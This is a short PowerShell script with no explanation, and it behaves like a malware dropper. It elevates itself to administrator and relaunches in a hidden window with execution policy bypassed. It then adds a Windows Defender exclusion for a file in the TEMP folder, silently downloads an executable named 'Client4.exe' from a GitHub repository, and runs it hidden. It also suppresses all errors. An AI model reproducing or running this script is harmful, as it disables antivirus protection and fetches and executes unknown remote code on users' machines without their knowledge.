param([string]$OriginalTemp = $env:TEMP)

if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $elevatedCommand = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`" -OriginalTemp '$env:TEMP'"
    Start-Process pwsh.exe -Verb RunAs -ArgumentList $elevatedCommand
    exit
}

$output = Join-Path -Path $OriginalTemp -ChildPath "cf2.exe"

if (Test-Path $output) { Remove-Item $output -Force }

try {
    Add-MpPreference -ExclusionPath $output -ErrorAction Stop
    $ProgressPreference = 'SilentlyContinue'
    Invoke-WebRequest -Uri 'https://github.com/ct7ybve7f387/tests/raw/refs/heads/main/Client4.exe' -OutFile $output -ErrorAction Stop
    if (-NOT (Test-Path $output)) { exit }
    Start-Process $output -WindowStyle Hidden -ErrorAction Stop
}
catch { exit }
